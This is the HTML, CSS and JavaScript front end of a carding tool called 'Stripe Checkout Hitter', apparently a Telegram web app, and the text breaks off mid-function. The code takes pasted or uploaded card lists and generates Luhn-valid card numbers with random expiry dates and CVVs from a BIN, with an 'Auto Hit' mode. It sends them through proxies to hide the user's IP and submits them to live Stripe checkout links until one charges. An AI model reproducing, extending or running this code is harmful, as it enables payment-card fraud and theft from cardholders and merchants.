            font-size: 14px;
            line-height: 1.5;
            overflow-y: auto;
            position: relative;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background:
                radial-gradient(ellipse at 20% 20%, rgba(255,105,180,0.12) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 80%, rgba(138,43,226,0.12) 0%, transparent 50%),
                radial-gradient(ellipse at 50% 50%, rgba(255,20,147,0.06) 0%, transparent 60%);
            pointer-events: none; z-index: 0;
        }
        body::after {
            content: '';
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-image:
                radial-gradient(2px 2px at 20px 30px, #ff69b4, transparent),
                radial-gradient(2px 2px at 40px 70px, #ff1493, transparent),
                radial-gradient(2px 2px at 50px 160px, #da70d6, transparent),
                radial-gradient(2px 2px at 90px 40px, #ff69b4, transparent),
                radial-gradient(2px 2px at 130px 80px, #ba55d3, transparent),
                radial-gradient(2px 2px at 160px 120px, #ff1493, transparent);
            background-size: 200px 200px;
            animation: sparkle 4s linear infinite;
            pointer-events: none; z-index: 0;
        }
        @keyframes sparkle { 0%,100% { opacity: 0.5; } 50% { opacity: 1; } }
        input, textarea, select, button { font-family: inherit; }
        ::placeholder { color: var(--text-muted); opacity: 0.7; }
        ::-webkit-scrollbar { width: 4px; height: 4px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: rgba(255,105,180,0.2); border-radius: 4px; }

        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.4; } }
        @keyframes fadeIn { from { opacity:0; transform:translateY(8px); } to { opacity:1; transform:translateY(0); } }
        @keyframes badgePulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }

        .saved-bin-chip {
            background: var(--accent-dim); border: 1px solid var(--border); border-radius: 6px;
            padding: 4px 10px; color: var(--accent); cursor: pointer; font-family: var(--font-mono);
            font-size: 12px; display: inline-flex; align-items: center; gap: 6px;
            transition: all 0.15s ease; white-space: nowrap;
        }
        .saved-bin-chip:hover { background: rgba(255,105,180,0.25); border-color: var(--accent); }
        .saved-bin-chip:active { transform: scale(0.95); }
        .chip-x { font-size: 14px; opacity: 0.5; line-height: 1; }
        .chip-x:hover { opacity: 1; color: #ef4444; }

        .hit-container { padding: 16px 12px 80px; max-width: 520px; margin: 0 auto; position: relative; z-index: 10; }
        @media (min-width: 641px) { .hit-container { padding: 24px 20px 40px; max-width: 1100px; }
            .hit-grid { grid-template-columns: 1fr 1fr !important; gap: 20px !important; }
            .hit-title { font-size: 28px !important; }
        }

        .hit-title {
            font-size: 20px; font-weight: 800; font-family: var(--font-display); margin-bottom: 4px;
            background: linear-gradient(135deg, #fff 0%, #ff69b4 50%, #da70d6 100%);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
        }
        .hit-subtitle { font-size: 12px; color: var(--text-muted); margin: 0; }
        .hit-grid { display: grid; grid-template-columns: 1fr; gap: 12px; align-items: start; margin-top: 16px; }

        .s-input {
            width: 100%; background: var(--bg-input); border: 1px solid var(--border);
            border-radius: 6px; padding: 10px 14px; color: var(--text);
            font-family: var(--font-mono); font-size: 13px; outline: none;
            transition: border-color 0.2s;
        }
        .s-input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px var(--accent-dim); }

        .card-top { background: linear-gradient(145deg, rgba(45,27,61,0.8), rgba(30,15,45,0.9)); backdrop-filter: blur(15px); border: 1px solid var(--border); border-radius: 12px 12px 0 0; padding: 16px; border-bottom: none; }
        .card-mid { background: linear-gradient(145deg, rgba(45,27,61,0.8), rgba(30,15,45,0.9)); backdrop-filter: blur(15px); border-left: 1px solid var(--border); border-right: 1px solid var(--border); padding: 0 16px; }
        .card-mid-section { padding: 14px 16px; border-top: 1px solid var(--border-dim); background: linear-gradient(145deg, rgba(45,27,61,0.8), rgba(30,15,45,0.9)); backdrop-filter: blur(15px); border-left: 1px solid var(--border); border-right: 1px solid var(--border); }
        .card-bottom { background: linear-gradient(145deg, rgba(45,27,61,0.8), rgba(30,15,45,0.9)); backdrop-filter: blur(15px); border: 1px solid var(--border); border-radius: 0 0 12px 12px; padding: 16px; }

        .bin-toggle-btn {
            width: 100%; background: none; border: none; border-top: 1px solid var(--border-dim);
            padding: 10px 0; display: flex; align-items: center; gap: 8px;
            cursor: pointer; color: var(--accent); font-size: 12px; font-weight: 600; letter-spacing: 0.04em;
        }
        .bin-toggle-btn .arrow { margin-left: auto; transition: transform 0.2s; font-size: 14px; }
        .bin-toggle-btn.open .arrow { transform: rotate(90deg); }

        .proxy-tabs { display: flex; gap: 0; border-radius: 6px; overflow: hidden; margin-bottom: 14px; }
        .proxy-tab {
            flex: 1; padding: 8px 12px; background: transparent; border: none;
            color: var(--text-muted); cursor: pointer; display: flex; align-items: center;
            justify-content: center; gap: 6px; font-size: 12px; font-weight: 400;
            transition: all 0.15s; border-bottom: 2px solid transparent;
        }
        .proxy-tab.active { background: rgba(255,105,180,0.15); color: #f0e6f6; font-weight: 600; border-bottom-color: var(--accent); }

        .btn-start {
            width: 100%; padding: 14px 24px; font-size: 15px; font-weight: 700;
            background: linear-gradient(135deg, #ff1493, #ff69b4); color: #fff; border: none; border-radius: 12px;
            cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;
            font-family: var(--font-display); transition: all 0.3s cubic-bezier(0.4,0,0.2,1);
            box-shadow: 0 4px 20px rgba(255,20,147,0.3);
        }
        .btn-start:disabled { background: rgba(255,105,180,0.15); color: rgba(255,105,180,0.4); cursor: default; box-shadow: none; }
        .btn-start:hover:not(:disabled) { background: linear-gradient(135deg, #e91380, #ff5aa5); box-shadow: 0 6px 30px rgba(255,20,147,0.4); transform: translateY(-2px); }

        .btn-stop {
            width: 100%; padding: 14px 24px; font-size: 14px; font-weight: 700;
            background: linear-gradient(135deg, #ef4444, #dc2626); color: #fff; border: none; border-radius: 12px;
            cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px;
            font-family: var(--font-display); box-shadow: 0 4px 15px rgba(239,68,68,0.3);
        }

        .btn-fetch {
            padding: 10px 16px; border-radius: 10px; border: none; cursor: pointer;
            font-family: var(--font-display); font-size: 12px; font-weight: 700;
            display: flex; align-items: center; gap: 6px; transition: all 0.3s; flex-shrink: 0;
        }
        .btn-fetch.active { background: linear-gradient(135deg, #ff69b4, #da70d6); color: #fff; box-shadow: 0 2px 10px rgba(255,20,147,0.3); }
        .btn-fetch.inactive { background: rgba(255,105,180,0.1); color: var(--text-muted); cursor: default; }

        .btn-gen {
            width: 100%; padding: 10px; border-radius: 10px; border: none; cursor: pointer;
            font-family: var(--font-display); font-size: 13px; font-weight: 700;
            display: flex; align-items: center; justify-content: center; gap: 6px;
            transition: all 0.3s;
        }
        .btn-gen.ready { background: linear-gradient(135deg, #ff69b4, #da70d6); color: #fff; box-shadow: 0 2px 10px rgba(255,20,147,0.2); }
        .btn-gen.dim { background: rgba(255,105,180,0.1); color: var(--text-muted); cursor: default; }

        .btn-copy {
            padding: 14px 16px; background: rgba(34,197,94,0.1); border: 1px solid rgba(34,197,94,0.3);
            border-radius: 8px; color: #22c55e; cursor: pointer; font-size: 12px; font-weight: 600;
            display: flex; align-items: center; gap: 4px; font-family: var(--font-display);
        }

        .checkout-info-panel {
            background: rgba(30,15,45,0.9); border: 1px solid var(--border); border-radius: 10px; overflow: hidden;
        }
        .checkout-info-row {
            display: flex; justify-content: space-between; align-items: center;
            padding: 9px 14px; border-bottom: 1px solid var(--border-dim);
        }
        .checkout-info-row:last-child { border-bottom: none; }
        .checkout-info-label {
            font-size: 11px; font-weight: 600; color: var(--text-muted);
            letter-spacing: 0.06em; text-transform: uppercase;
        }
        .checkout-info-value {
            font-family: var(--font-mono); font-size: 12px; color: var(--text);
            text-align: right; max-width: 58%; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
        }

        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; }
        .stat-card {
            background: linear-gradient(145deg, rgba(255,105,180,0.08), rgba(138,43,226,0.08));
            border: 1px solid var(--border); border-radius: 12px;
            padding: 12px 14px; text-align: center;
            backdrop-filter: blur(10px); transition: all 0.3s ease;
        }
        .stat-card:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(255,20,147,0.15); border-color: var(--border-bright); }
        .stat-val { font-size: 20px; font-weight: 800; line-height: 1; font-family: var(--font-display); }
        .stat-lbl { font-size: 10px; color: var(--text-muted); margin-top: 4px; font-weight: 600; }

        .results-panel {
            background: linear-gradient(145deg, rgba(45,27,61,0.8), rgba(30,15,45,0.9));
            backdrop-filter: blur(15px); border: 1px solid var(--border); border-radius: 12px;
            min-height: 300px; display: flex; flex-direction: column; overflow: hidden;
            box-shadow: 0 5px 30px rgba(0,0,0,0.3);
        }
        .result-empty {
            flex: 1; display: flex; flex-direction: column; align-items: center;
            justify-content: center; gap: 14px; padding: 60px 20px;
        }
        .result-empty-icon {
            width: 52px; height: 52px; border-radius: 50%; border: 1px solid var(--border);
            display: flex; align-items: center; justify-content: center;
            opacity: 0.5; background: rgba(255,105,180,0.08);
        }
        .result-item {
            display: flex; align-items: center; gap: 10px; padding: 9px 14px;
            border-bottom: 1px solid var(--border-dim); animation: fadeIn 0.3s ease-out;
        }
        .result-item.hit { background: rgba(34,197,94,0.06); }
        .result-item.checking { background: rgba(255,105,180,0.03); }
        .result-card {
            font-family: var(--font-mono); font-size: 11px; color: var(--text-dim);
            flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
        }
        .result-card.live { color: #22c55e; }
        .badge {
            font-family: var(--font-mono); font-size: 10px; font-weight: 500;
            letter-spacing: 0.04em; padding: 2px 8px; text-transform: uppercase;
            display: inline-flex; align-items: center; border-radius: 4px;
        }
        .badge-charged { color: #22c55e; border: 1px solid rgba(34,197,94,0.4); background: rgba(34,197,94,0.12); }
        .badge-live { color: #4ade80; border: 1px solid rgba(74,222,128,0.4); background: rgba(74,222,128,0.1); }
        .badge-declined { color: #ef4444; border: 1px solid rgba(239,68,68,0.3); background: rgba(239,68,68,0.12); }
        .badge-dead { color: var(--text-muted); border: 1px solid var(--border); background: rgba(0,0,0,0.3); }
        .badge-3ds { color: #eab308; border: 1px solid rgba(234,179,8,0.4); background: rgba(234,179,8,0.1); }
        .badge-error { color: #f59e0b; border: 1px solid rgba(245,158,11,0.3); background: rgba(245,158,11,0.1); }
        .badge-checking { color: var(--text-dim); border: 1px solid rgba(148,163,184,0.3); background: rgba(148,163,184,0.08); animation: badgePulse 1s ease-in-out infinite; }

        .progress-bar {
            display: flex; align-items: center; gap: 8px; padding: 10px 14px;
            background: linear-gradient(145deg, rgba(45,27,61,0.8), rgba(30,15,45,0.9));
            backdrop-filter: blur(15px); border: 1px solid var(--border); border-radius: 12px;
        }
        .progress-dot {
            width: 8px; height: 8px; border-radius: 50%; background: #ff69b4;
            animation: pulse 1.5s ease-in-out infinite;
            box-shadow: 0 0 8px rgba(255,105,180,0.5);
        }
        .progress-track { flex: 1; height: 3px; background: rgba(255,105,180,0.15); border-radius: 2px; overflow: hidden; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #ff1493, #ff69b4); border-radius: 2px; transition: width 0.3s; width: 0%; }

        .warning-bar {
            display: flex; align-items: center; gap: 8px; padding: 8px 12px;
            background: rgba(245,158,11,0.08); border: 1px solid rgba(245,158,11,0.2);
            border-radius: 6px; margin-bottom: 12px; font-size: 11px; color: #f59e0b;
        }

        .toggle-wrap {
            width: 32px; height: 18px; border-radius: 9px; position: relative;
            cursor: pointer; transition: background 0.2s; flex-shrink: 0;
        }
        .toggle-wrap.off { background: rgba(255,105,180,0.2); }
        .toggle-wrap.on { background: linear-gradient(135deg, #ff1493, #ff69b4); }
        .toggle-dot {
            width: 14px; height: 14px; border-radius: 50%; background: #fff;
            position: absolute; top: 2px; transition: left 0.2s;
        }
        .toggle-wrap.off .toggle-dot { left: 2px; }
        .toggle-wrap.on .toggle-dot { left: 16px; }

        .toast {
            position: fixed; bottom: 70px; left: 50%; transform: translateX(-50%);
            padding: 10px 16px; border-radius: 8px; display: flex; align-items: center; gap: 8px;
            z-index: 999; animation: fadeIn 0.3s ease; backdrop-filter: blur(8px); max-width: 90vw;
        }
        .toast-success { background: rgba(34,197,94,0.12); border: 1px solid rgba(34,197,94,0.3); }
        .toast-error { background: rgba(239,68,68,0.12); border: 1px solid rgba(239,68,68,0.3); }

        .file-btn { background: none; border: none; color: var(--text-muted); cursor: pointer; display: flex; align-items: center; gap: 4px; font-size: 12px; }
    </style>
    </head>
    <body>

    <div class="hit-container">
        <div style="margin-bottom: 16px;">
            <h1 class="hit-title">Stripe Checkout Hitter</h1>
            <p class="hit-subtitle">Hit Stripe checkout links with ccs. Stops on successful charge.</p>
        </div>

        <div class="hit-grid">
            <!-- LEFT PANEL -->
            <div style="display:flex;flex-direction:column;gap:0;">

                <!-- CC Textarea -->
                <div class="card-top" id="cc-drop-zone">
                    <textarea id="cc-input" class="s-input" rows="5" placeholder="Paste ccs here or drop a .txt file"
                        style="background:transparent;border:none;padding:0;resize:vertical;min-height:80px;"></textarea>
                    <div style="display:flex;align-items:center;justify-content:space-between;margin-top:8px;">
                        <button class="file-btn" onclick="document.getElementById('file-input').click()">+</button>
                        <input id="file-input" type="file" accept=".txt,.csv" hidden>
                        <span id="card-count" style="font-family:var(--font-mono);font-size:11px;color:var(--text-muted);display:none;"></span>
                    </div>
                </div>

                <!-- BIN Auto-Generate -->
                <div class="card-mid">
                    <button class="bin-toggle-btn" id="bin-toggle" onclick="toggleBinPanel()">
                        &#10024; <span>BIN Auto-Generate</span>
                        <span class="arrow">&#8250;</span>
                    </button>
                    <div id="bin-panel" style="display:none;padding-bottom:14px;">
                        <div id="saved-bins-wrap" style="display:none;margin-bottom:8px;">
                            <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:4px;">
                                <label style="font-size:11px;color:var(--text-muted);font-weight:600;">Saved BINs</label>
                                <button onclick="clearAllBins()" style="background:none;border:none;color:var(--accent);cursor:pointer;font-size:10px;opacity:0.6;">Clear All</button>
                            </div>
                            <div id="saved-bins-list" style="display:flex;flex-wrap:wrap;gap:4px;"></div>
                        </div>
                        <div style="display:flex;gap:8px;margin-bottom:8px;">
                            <input id="bin-input" class="s-input" placeholder="Enter BIN (6+ digits)" maxlength="16" style="flex:1;">
                            <button id="save-bin-btn" onclick="saveBin()" title="Save BIN" style="background:var(--accent-dim);border:1px solid var(--border);border-radius:6px;color:var(--accent);cursor:pointer;padding:0 12px;font-size:16px;display:flex;align-items:center;transition:all 0.2s;">&#9733;</button>
                        </div>
                        <div style="display:flex;gap:8px;align-items:center;margin-bottom:8px;">
                            <label style="font-size:11px;color:var(--text-muted);white-space:nowrap;">Qty:</label>
                            <input id="bin-qty" type="number" value="10" min="1" max="100" class="s-input" style="width:60px;padding:6px 8px;text-align:center;font-size:12px;">
                            <label style="display:flex;align-items:center;gap:6px;cursor:pointer;font-size:11px;color:var(--text-muted);margin-left:auto;">
                                <div id="auto-hit-toggle" class="toggle-wrap off" onclick="toggleAutoHit()">
                                    <div class="toggle-dot"></div>
                                </div>
                                Auto Hit
                            </label>
                        </div>
                        <button id="gen-btn" class="btn-gen dim" onclick="handleGenerate()" disabled>
                            &#10024; Generate 10 Cards
                        </button>
                    </div>
                </div>

                <!-- Checkout Link -->
                <div class="card-mid-section">
                    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;">
                        <label style="font-size:13px;font-weight:600;color:var(--text);">Checkout Link</label>
                        <button id="checkout-reset-btn" onclick="resetCheckout()" style="background:none;border:none;color:var(--accent);cursor:pointer;font-size:12px;font-weight:500;display:none;">Reset</button>
                    </div>
                    <div style="display:flex;gap:8px;">
                        <input id="checkout-url" class="s-input" placeholder="https://checkout.stripe.com/c/pay/cs_live_..." style="flex:1;">
                        <button id="fetch-btn" class="btn-fetch inactive" onclick="fetchCheckoutInfo()">
                            &#9889; Fetch
                        </button>
                    </div>
                </div>

                <!-- Email -->
                <div class="card-mid-section">
                    <label style="font-size:13px;font-weight:600;color:var(--text);margin-bottom:8px;display:block;">
                        Email <span style="font-weight:400;color:var(--text-muted);">(optional)</span>
                    </label>
                    <input id="email-input" class="s-input" placeholder="customer@example.com">
                </div>

                <!-- Checkout Info Panel -->
                <div id="checkout-info-wrap" class="card-mid-section" style="display:none;padding-top:0;border-top:none;">
                    <div id="checkout-info" class="checkout-info-panel"></div>
                </div>

                <!-- Proxy + Start -->
                <div class="card-bottom">
                    <div class="proxy-tabs">
                        <button class="proxy-tab active" data-mode="system" onclick="setProxyMode('system')">&#127760; System</button>
                        <button class="proxy-tab" data-mode="own" onclick="setProxyMode('own')">&#128225; Enabled</button>
                        <button class="proxy-tab" data-mode="direct" onclick="setProxyMode('direct')">&#9776; Select One</button>
                    </div>

                    <div id="direct-warning" class="warning-bar" style="display:none;">
                        &#9888; Direct mode &mdash; your real IP is exposed
                    </div>
                    <div id="own-proxy-wrap" style="display:none;margin-bottom:12px;">
                        <input id="own-proxy" class="s-input" placeholder="host:port:user:pass" style="font-size:12px;">
                    </div>

                    <div style="display:flex;gap:8px;">
                        <button id="start-btn" class="btn-start" onclick="handleStart()" disabled>
                            Start Hitting &#8594;
                        </button>
                        <button id="stop-btn" class="btn-stop" onclick="handleStop()" style="display:none;">
                            &#9632; Stop
                        </button>
                        <button id="copy-btn" class="btn-copy" onclick="copyCharged()" style="display:none;">
                            &#128203; COPY <span id="copy-count">0</span>
                        </button>
                    </div>
                </div>
            </div>

            <!-- RIGHT PANEL -->
            <div style="display:flex;flex-direction:column;gap:12px;">
                <!-- Stats -->
                <div id="stats-panel" style="display:none;">
                    <div class="stats-grid">
                        <div class="stat-card"><div class="stat-val" id="s-charged" style="color:#22c55e;">0</div><div class="stat-lbl">Charged</div></div>
                        <div class="stat-card"><div class="stat-val" id="s-declined" style="color:#ef4444;">0</div><div class="stat-lbl">Declined</div></div>
                        <div class="stat-card"><div class="stat-val" id="s-errors" style="color:#f97316;">0</div><div class="stat-lbl">Errors</div></div>
                        <div class="stat-card"><div class="stat-val" id="s-total" style="color:#9896a8;">0</div><div class="stat-lbl">Total</div></div>
                    </div>
                </div>

                <!-- Results -->
                <div class="results-panel" id="results-panel">
                    <div class="result-empty" id="empty-state">
                        <div class="result-empty-icon">&#9889;</div>
                        <div style="text-align:center;">
                            <div style="font-size:16px;font-weight:600;color:var(--text-dim);margin-bottom:6px;font-family:var(--font-display);">No Hits Yet</div>
                            <div style="font-size:12px;color:var(--text-muted);line-height:1.5;">Configure your checkout link and add ccs to start hitting.</div>
                        </div>
                    </div>
                    <div id="results-list" style="overflow-y:auto;flex:1;display:none;"></div>
                </div>

                <!-- Progress -->
                <div id="progress-panel" class="progress-bar" style="display:none;">
                    <div class="progress-dot"></div>
                    <span id="progress-text" style="font-size:12px;color:var(--text-muted);">Processing...</span>
                    <div class="progress-track"><div class="progress-fill" id="progress-fill"></div></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Toast -->
    <div id="toast" class="toast toast-success" style="display:none;">
        <span id="toast-msg" style="font-size:12px;font-weight:500;"></span>
    </div>

    <script>
    if(window.Telegram&&window.Telegram.WebApp){var tg=window.Telegram.WebApp;tg.ready();tg.expand();try{tg.setHeaderColor('#1a0a1f')}catch(e){}try{tg.setBackgroundColor('#1a0a1f')}catch(e){}try{tg.setBottomBarColor('#1a0a1f')}catch(e){}}

    let proxyMode='system', ownProxy='', autoHit=false, running=false, stopRequested=false;
    let results=[], checkoutData=null, fetchingCheckout=false;

    function showToast(msg, type='success') {
        const t=document.getElementById('toast');
        const m=document.getElementById('toast-msg');
        t.className='toast toast-'+type;
        m.textContent=msg;
        m.style.color=type==='success'?'#22c55e':'#ef4444';
        t.style.display='flex';
        setTimeout(()=>{t.style.display='none'},3500);
    }

    function countCards() {
        const lines=document.getElementById('cc-input').value.split('\\n').filter(l=>l.trim());
        const el=document.getElementById('card-count');
        const btn=document.getElementById('start-btn');
        if(lines.length>0){el.style.display='inline';el.textContent=lines.length+' card'+(lines.length!==1?'s':'');}
        else{el.style.display='none';}
        btn.disabled=lines.length===0||running;
    }
    document.getElementById('cc-input').addEventListener('input',countCards);

    document.getElementById('checkout-url').addEventListener('input',function(){
        const v=this.value.trim();
        const fb=document.getElementById('fetch-btn');
        const rb=document.getElementById('checkout-reset-btn');
        fb.className='btn-fetch '+(v?'active':'inactive');
        rb.style.display=v?'inline':'none';
    });

    document.getElementById('cc-drop-zone').addEventListener('dragover',e=>e.preventDefault());
    document.getElementById('cc-drop-zone').addEventListener('drop',function(e){
        e.preventDefault();
        const file=e.dataTransfer?.files?.[0];
        if(!file)return;
        const reader=new FileReader();
        reader.onload=ev=>{document.getElementById('cc-input').value=ev.target.result;countCards();showToast('Loaded '+file.name);};
        reader.readAsText(file);
    });
    document.getElementById('file-input').addEventListener('change',function(e){
        const file=e.target?.files?.[0];
        if(!file)return;
        const reader=new FileReader();
        reader.onload=ev=>{document.getElementById('cc-input').value=ev.target.result;countCards();showToast('Loaded '+file.name);};
        reader.readAsText(file);
    });

    function getSavedBins(){try{return JSON.parse(localStorage.getItem('onichan_saved_bins')||'[]');}catch(e){return[];}}
    function setSavedBins(bins){localStorage.setItem('onichan_saved_bins',JSON.stringify(bins));}

    function renderSavedBins(){
        const bins=getSavedBins();
        const wrap=document.getElementById('saved-bins-wrap');
        const list=document.getElementById('saved-bins-list');
        if(!bins.length){wrap.style.display='none';return;}
        wrap.style.display='block';
        list.innerHTML='';
        bins.forEach(function(b){
            const chip=document.createElement('button');
            chip.className='saved-bin-chip';
            var txt=document.createTextNode(b+' ');
            chip.appendChild(txt);
            var xspan=document.createElement('span');
            xspan.className='chip-x';
            xspan.textContent=String.fromCharCode(215);
            xspan.addEventListener('click',function(ev){ev.stopPropagation();removeBin(b);});
            chip.appendChild(xspan);
            chip.addEventListener('click',function(){document.getElementById('bin-input').value=b;updateGenBtn();updateSaveBtnState();});
            list.appendChild(chip);
        });
    }

    function saveBin(){
        const bin=document.getElementById('bin-input').value.replace(/[^0-9]/g,'');
        if(bin.length<6){showToast('BIN must be at least 6 digits','error');return;}
        const bins=getSavedBins();
        const short=bin.slice(0,8);
        if(bins.includes(short)){showToast('BIN already saved');return;}
        bins.unshift(short);
        if(bins.length>20)bins.pop();
        setSavedBins(bins);
        renderSavedBins();
        updateSaveBtnState();
        showToast('BIN '+short+' saved!');
    }

    function removeBin(bin){
        const bins=getSavedBins().filter(function(b){return b!==bin;});
        setSavedBins(bins);
        renderSavedBins();
        updateSaveBtnState();
    }

    function clearAllBins(){
        setSavedBins([]);
        renderSavedBins();
        updateSaveBtnState();
        showToast('All saved BINs cleared');
    }

    function updateSaveBtnState(){
        const btn=document.getElementById('save-bin-btn');
        const bin=document.getElementById('bin-input').value.replace(/[^0-9]/g,'').slice(0,8);
        const saved=getSavedBins().includes(bin);
        btn.style.color=saved?'#22c55e':'var(--accent)';
        btn.innerHTML=saved?'&#9733;':'&#9734;';
    }

    renderSavedBins();

    function toggleBinPanel(){
        const p=document.getElementById('bin-panel');
        const b=document.getElementById('bin-toggle');
        const vis=p.style.display==='none';
        p.style.display=vis?'block':'none';
        b.className='bin-toggle-btn'+(vis?' open':'');
    }

    document.getElementById('bin-input').addEventListener('input',function(){
        this.value=this.value.replace(/[^0-9x]/gi,'').slice(0,16);
        updateGenBtn();
        updateSaveBtnState();
    });
    document.getElementById('bin-qty').addEventListener('input',function(){
        this.value=Math.max(1,Math.min(100,parseInt(this.value)||1));
        updateGenBtn();
    });

    function updateGenBtn(){
        const bin=document.getElementById('bin-input').value;
        const qty=parseInt(document.getElementById('bin-qty').value)||10;
        const btn=document.getElementById('gen-btn');
        const ready=bin.length>=6&&!running;
        btn.className='btn-gen '+(ready?'ready':'dim');
        btn.disabled=!ready;
        btn.innerHTML='&#10024; '+(autoHit?'Generate & Auto Hit':'Generate '+qty+' Cards');
    }

    function toggleAutoHit(){
        autoHit=!autoHit;
        const el=document.getElementById('auto-hit-toggle');
        el.className='toggle-wrap '+(autoHit?'on':'off');
        el.querySelector('label')&&(el.parentElement.style.color=autoHit?'var(--accent)':'var(--text-muted)');
        updateGenBtn();
    }

    function luhnComplete(partial,targetLen){
        targetLen=targetLen||16;
        let s=partial;
        while(s.length<targetLen-1)s+=Math.floor(Math.random()*10);
        s=s.slice(0,targetLen-1);
        let sum=0;const n=s.length;
        for(let i=0;i<n;i++){let d=parseInt(s[i],10);if((n-i)%2===1){d*=2;if(d>9)d-=9;}sum+=d;}
        return s+((10-(sum%10))%10);
    }

    function getCardLength(bin){
        if(bin.startsWith('34')||bin.startsWith('37'))return 15;
        if(bin.startsWith('36'))return 14;
        return 16;
    }

    function generateCards(bin,count){
        const cards=[];const now=new Date();const curYear=now.getFullYear()%100;
        const cleanBin=bin.replace(/[^0-9]/gi,'');
        const targetLen=getCardLength(cleanBin);
        const isAmex=cleanBin.startsWith('34')||cleanBin.startsWith('37');
        for(let i=0;i<count;i++){
            const num=luhnComplete(cleanBin,targetLen);
            const mm=String(1+Math.floor(Math.random()*12)).padStart(2,'0');
            const yy=String(curYear+1+Math.floor(Math.random()*5));
            const cvv=isAmex?String(1000+Math.floor(Math.random()*9000)):String(100+Math.floor(Math.random()*900));
            cards.push(num+'|'+mm+'|'+yy+'|'+cvv);
        }
        return cards;
    }

    async function handleGenerate(){
        const bin=document.getElementById('bin-input').value;
        const qty=parseInt(document.getElementById('bin-qty').value)||10;
        if(bin.length<6){showToast('BIN must be at least 6 digits','error');return;}
        const generated=generateCards(bin,qty);
        document.getElementById('cc-input').value=generated.join('\\n');
        countCards();
        showToast(generated.length+' cards generated from BIN '+bin.slice(0,6));
        if(autoHit){await new Promise(r=>setTimeout(r,200));await runHitting(generated);}
    }

    function setProxyMode(mode){
        proxyMode=mode;
        document.querySelectorAll('.proxy-tab').forEach(t=>{
            t.className='proxy-tab'+(t.dataset.mode===mode?' active':'');
        });
        document.getElementById('direct-warning').style.display=mode==='direct'?'flex':'none';
        document.getElementById('own-proxy-wrap').style.display=mode==='own'?'block':'none';
    }

    function resetCheckout(){
        document.getElementById('checkout-url').value='';
        document.getElementById('checkout-info-wrap').style.display='none';
        document.getElementById('checkout-info').innerHTML='';
        document.getElementById('checkout-reset-btn').style.display='none';
        document.getElementById('fetch-btn').className='btn-fetch inactive';
        checkoutData=null;
    }

    async function getProxy(){
        if(proxyMode==='own'){
            const p=document.getElementById('own-proxy').value.trim();
            if(p)return p;
        }
        if(proxyMode==='system'){
            try{const r=await fetch('/api/proxy/system');const d=await r.json();if(d.proxy)return d.proxy;}catch(e){}
        }
        return '';
    }

    async function fetchCheckoutInfo(){
        const url=document.getElementById('checkout-url').value.trim();
        if(!url){showToast('Enter a checkout URL first','error');return;}
        if(fetchingCheckout)return;
        fetchingCheckout=true;
        const fb=document.getElementById('fetch-btn');
        fb.innerHTML='<span style="display:inline-block;width:13px;height:13px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;"></span> Fetching';
        fb.style.opacity='0.7';
        const proxy=await getProxy();
        const wrap=document.getElementById('checkout-info-wrap');
        const info=document.getElementById('checkout-info');

        try{
            const resp=await fetch('/api/checkout/info',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:url,proxy:proxy})});
            const data=await resp.json();
            if(data.error){
                wrap.style.display='block';
                info.innerHTML='<div class="checkout-info-row"><span class="checkout-info-label">ERROR</span><span class="checkout-info-value" style="color:#ef4444;">'+data.error+'</span></div>';
                checkoutData=null;
                showToast('Failed to fetch checkout','error');
            } else {
                checkoutData=data;
                wrap.style.display='block';
                let rows='';
                const fields=[
                    {l:'MERCHANT',v:data.merchant},
                    {l:'AMOUNT',v:(data.price||'0.00')+' '+(data.currency||'')},
                    {l:'PRODUCT',v:data.product},
                    {l:'SITE',v:data.site},
                ];
                fields.forEach(f=>{if(f.v)rows+='<div class="checkout-info-row"><span class="checkout-info-label">'+f.l+'</span><span class="checkout-info-value">'+f.v+'</span></div>';});
                info.innerHTML=rows;
                showToast('Checkout data loaded');
            }
        }catch(err){
            wrap.style.display='block';
            info.innerHTML='<div class="checkout-info-row"><span class="checkout-info-label">ERROR</span><span class="checkout-info-value" style="color:#ef4444;">'+err.message+'</span></div>';
            showToast('Failed to fetch checkout','error');
        }
        fb.innerHTML='&#9889; Fetch';
        fb.style.opacity='1';
        fetchingCheckout=false;
    }

    function getBadgeClass(status){
        const s=(status||'').toUpperCase();
        if(s==='CHARGED')return'badge badge-charged';
        if(s==='LIVE')return'badge badge-live';
        if(s==='DECLINED'||s==='DEAD')return'badge badge-declined';
        if(s==='3DS'||s==='3DS_REQUIRED')return'badge badge-3ds';
        if(s==='CHECKING')return'badge badge-checking';
        if(s==='EXPIRED'||s==='NOT SUPPORTED'||s==='FAILED')return'badge badge-dead';
        return'badge badge-error';
    }

    function updateStats(){
        const charged=results.filter(r=>r.status==='CHARGED'||r.status==='LIVE').length;
        const declined=results.filter(r=>r.status==='DECLINED'||r.status==='DEAD'||r.status==='3DS_REQUIRED').length;
        const errors=results.filter(r=>r.status==='ERROR'||r.status==='FAILED'||r.status==='EXPIRED'||r.status==='NOT SUPPORTED').length;
        document.getElementById('s-charged').textContent=charged;
        document.getElementById('s-declined').textContent=declined;
        document.getElementById('s-errors').textContent=errors;
        document.getElementById('s-total').textContent=results.length;
        document.getElementById('stats-panel').style.display=results.length>0?'block':'none';
        document.getElementById('copy-btn').style.display=charged>0?'flex':'none';
        document.getElementById('copy-count').textContent=charged;
    }

    function renderResults(){
        const list=document.getElementById('results-list');
        const empty=document.getElementById('empty-state');
